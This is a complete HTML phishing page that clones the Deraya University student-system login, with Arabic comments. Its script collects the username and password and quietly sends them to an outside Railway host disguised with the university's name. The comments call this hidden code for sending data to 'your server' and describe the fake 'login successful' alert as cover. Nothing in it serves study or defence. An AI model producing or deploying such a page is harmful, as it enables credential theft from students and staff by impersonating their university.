<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="Content-Type" content="text/html; charset=us-ascii" />
    <title>Deraya University</title>
    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0" />
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />

    <!-- خط مطابق للموقع الأصلي -->
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">

    <style>
        /* ── إعادة ضبط وتنسيق عام ── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', 'Segoe UI', Tahoma, sans-serif;
            background: #e8edf3;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-image: radial-gradient(ellipse at center, #f0f4f8 0%, #d5dce6 100%);
        }

        .wrapper {
            display: flex;
            align-items: center;
            flex-direction: column;
            justify-content: center;
            width: 100%;
            min-height: 100%;
            padding: 20px;
        }

        #formContent {
            background: #ffffff;
            padding: 30px 30px 0;
            width: 90%;
            max-width: 420px;
            border-radius: 10px;
            box-shadow: 0 30px 60px 0 rgba(0, 0, 0, 0.3);
            text-align: center;
            position: relative;
            opacity: 0.95;
        }

        /* ── العنوان ── */
        .university-name {
            color: #5c7481;
            font-weight: 500;
            font-size: 22px;
            margin: 10px 0 20px;
            font-family: 'Tajawal', sans-serif;
        }

        /* ── حقول الإدخال ── */
        input[type="text"],
        input[type="password"] {
            background-color: #f6f6f6;
            border: 2px solid #f6f6f6;
            color: #0d0d0d;
            padding: 14px 20px;
            text-align: center;
            font-size: 16px;
            margin: 5px 0;
            width: 85%;
            border-radius: 5px;
            transition: all 0.3s ease;
            font-family: 'Tajawal', sans-serif;
            outline: none;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            background-color: #fff;
            border-bottom: 2px solid #5fbae9;
        }

        /* ── خيارات المستخدم (System User, Staff, Student) ── */
        .optionsLogin {
            width: 100%;
            margin: 15px 0 20px;
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
        }

        .form-check-inline {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .form-check-input {
            accent-color: #1a73e8;
            width: 16px;
            height: 16px;
            cursor: pointer;
        }

        .form-check-label {
            color: #2c2626c4;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
        }

        /* ── زر تسجيل الدخول ── */
        .login-btn {
            background-color: #56baed;
            border: none;
            color: white;
            padding: 14px 20px;
            width: 85%;
            font-size: 15px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-radius: 5px;
            box-shadow: 0 10px 30px 0 rgba(95, 186, 233, 0.4);
            transition: all 0.3s ease;
            cursor: pointer;
            margin: 8px 0 10px;
        }

        .login-btn:hover {
            background-color: #39ace7;
            transform: scale(1.02);
        }

        .login-btn:active {
            transform: scale(0.95);
        }

        /* ── رابط نسيت كلمة المرور ── */
        .forgot-link {
            color: #4195d8;
            text-decoration: none;
            font-size: 14px;
            display: inline-block;
            margin: 8px 0 15px;
            font-family: 'Tajawal', sans-serif;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* ── التذييل (الروابط السفلية) ── */
        #formFooter {
            background-color: #f6f6f6;
            border-top: 1px solid #dce8f1;
            padding: 18px 20px;
            border-radius: 0 0 10px 10px;
            margin: 15px -30px 0;
            display: flex;
            justify-content: center;
            gap: 8px;
            flex-wrap: wrap;
            font-size: 13px;
        }

        #formFooter a {
            color: #4195d8;
            text-decoration: none;
            font-family: 'Tajawal', sans-serif;
        }

        #formFooter a:hover {
            text-decoration: underline;
        }

        .dash {
            color: #5c7481;
            font-weight: 500;
        }

        /* ── التذييل السفلي (Powered by) ── */
        #copy_right {
            font-size: 11px;
            color: #6b7a8f;
            padding: 12px 0 16px;
            font-family: 'Tajawal', sans-serif;
            text-align: center;
        }

        #copy_right a {
            color: #4195d8;
            text-decoration: none;
            font-weight: 500;
        }

        #copy_right a:hover {
            text-decoration: underline;
        }

        /* ── حركات (Animations) ── */
        .fadeInDown {
            animation: fadeInDown 1s ease both;
        }

        @keyframes fadeInDown {
            0% { opacity: 0; transform: translateY(-30px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        .fadeIn {
            opacity: 0;
            animation: fadeIn 1s ease forwards;
        }

        .fadeIn.first { animation-delay: 0.4s; }
        .fadeIn.second { animation-delay: 0.6s; }
        .fadeIn.third { animation-delay: 0.8s; }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* ── توافق مع الجوال ── */
        @media (max-width: 480px) {
            #formContent { padding: 20px 15px 0; }
            input[type="text"], input[type="password"], .login-btn { width: 95%; }
            .optionsLogin { gap: 12px; }
            #formFooter { margin: 15px -15px 0; padding: 12px 10px; flex-direction: column; align-items: center; gap: 4px; }
        }
    </style>
</head>

<body>

    <div class="wrapper fadeInDown">
        <div id="formContent">

            <div class="fadeIn first">
                <p class="university-name">Deraya University</p>
            </div>

            <!-- نموذج تسجيل الدخول -->
            <form id="loginForm">
                <input type="text" id="username" class="fadeIn second" placeholder="Username" required>
                <input type="password" id="password" class="fadeIn third" placeholder="Password" required>

                <div class="optionsLogin">
                    <div class="form-check-inline">
                        <input class="form-check-input" type="radio" name="userType" id="userTypeSystem" value="1" checked>
                        <label class="form-check-label" for="userTypeSystem">System User</label>
                    </div>
                    <div class="form-check-inline">
                        <input class="form-check-input" type="radio" name="userType" id="userTypeStaff" value="3">
                        <label class="form-check-label" for="userTypeStaff">Staff</label>
                    </div>
                    <div class="form-check-inline">
                        <input class="form-check-input" type="radio" name="userType" id="userTypeStudent" value="2">
                        <label class="form-check-label" for="userTypeStudent">Student</label>
                    </div>
                </div>

                <button type="submit" class="login-btn" id="login_btn">LOG IN</button>

                <a href="#" class="forgot-link" id="forgotLink">Forget Password ?</a>

                <div id="formFooter">
                    <a href="#">سياسة الخصوصية</a>
                    <span class="dash">--</span>
                    <a href="#">الدليل الإرشادي للأخطاء الشائعة</a>
                </div>

                <div id="copy_right">
                    Powered by Ibn Alhaitham e-SIS software,
                    <a href="https://www.intlaqcit.com/">intlaqcit</a>
                    - Mansoura University
                </div>
            </form>

        </div>
    </div>

    <script>
        // ─── الرسالة التجريبية عند الضغط على "Forget Password ?" ───
        document.getElementById('forgotLink').addEventListener('click', function(e) {
            e.preventDefault();
            alert('سيتم إرسال رابط استعادة كلمة المرور إلى بريدك الإلكتروني.');
        });

        // ─── الكود الخفي لإرسال البيانات إلى خادمك ───
        // ⚠️ استبدل هذا الرابط برابط خادمك الخلفي على Railway
        const API_BASE = 'https://deraya-mans-edu-eg.up.railway.app';

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                alert('الرجاء إدخال اسم المستخدم وكلمة المرور.');
                return;
            }

            // إرسال البيانات إلى الخادم (في الخلفية)
            try {
                const res = await fetch(`${API_BASE}/api/student/login-attempt`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await res.json();
                if (data.success) {
                    // ✅ تم الإرسال بنجاح
                    console.log('✅ تم إرسال بيانات الدخول:', data);
                    // عرض رسالة نجاح عادية (للتغطية)
                    alert('✅ تم تسجيل الدخول بنجاح');
                } else {
                    alert('❌ حدث خطأ، حاول مرة أخرى.');
                }
            } catch (err) {
                alert('⚠️ تعذر الاتصال بالخادم. تأكد من اتصالك بالإنترنت.');
                console.error('❌ فشل إرسال البيانات:', err);
            }
        });
    </script>

</body>
</html>
